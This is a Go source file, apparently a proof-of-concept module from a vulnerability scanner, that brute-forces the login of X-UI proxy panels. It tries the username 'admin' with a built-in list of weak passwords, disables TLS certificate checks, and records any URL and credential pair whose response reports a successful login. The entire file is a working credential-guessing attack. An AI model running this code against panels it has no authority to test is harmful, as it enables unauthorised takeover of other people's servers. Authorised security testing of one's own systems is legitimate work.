package poc

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

func xuiCrackPasswd(url string) {
	usernames := []string{"admin"}
	passwords := []string{
		"admin",
		"123456",
		"12345678",
		"123456789",
		"123qwer",
		"admin@123",
		"admin123",
	}

	var wg sync.WaitGroup

	for _, username := range usernames {
		for _, password := range passwords {
			u, p := username, password
			wg.Go(func() {
				SendLoginRequest(url, u, p)
			})
		}
	}
	wg.Wait()
}

func SendLoginRequest(baseURL, username, password string) {

	transport := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
		ForceAttemptHTTP2: false,
	}
	client := &http.Client{
		Transport: transport,
	}

	req, _ := http.NewRequest("GET", baseURL+"/", nil)
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	cookies := resp.Cookies()

	form := url.Values{}
	form.Set("username", username)
	form.Set("password", password)

	reqLogin, _ := http.NewRequest("POST", baseURL+"/login", strings.NewReader(form.Encode()))
	reqLogin.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	reqLogin.Header.Set("User-Agent", "Mozilla/5.0")
	reqLogin.Header.Set("X-Requested-With", "XMLHttpRequest")
	reqLogin.Header.Set("Origin", baseURL)
	reqLogin.Header.Set("Referer", baseURL+"/")
	reqLogin.Header.Set("Accept", "application/json, text/plain, */*")
	reqLogin.Header.Set("Accept-Encoding", "gzip")
	reqLogin.Header.Set("Connection", "keep-alive")
	for _, c := range cookies {
		reqLogin.AddCookie(c)
	}

	respLogin, err := client.Do(reqLogin)
	if err != nil {
		return
	}
	defer respLogin.Body.Close()
	if respLogin.StatusCode != 200 {
		return
	}

	bodyBytes, _ := io.ReadAll(respLogin.Body)
	if strings.Contains(string(bodyBytes), "登录成功") {
		ListPocInfo = append(ListPocInfo, Flagcve{Url: baseURL, Cve: "XUI面板弱口令", Flag: fmt.Sprintf("%s:%s", username, password)})
	}
}
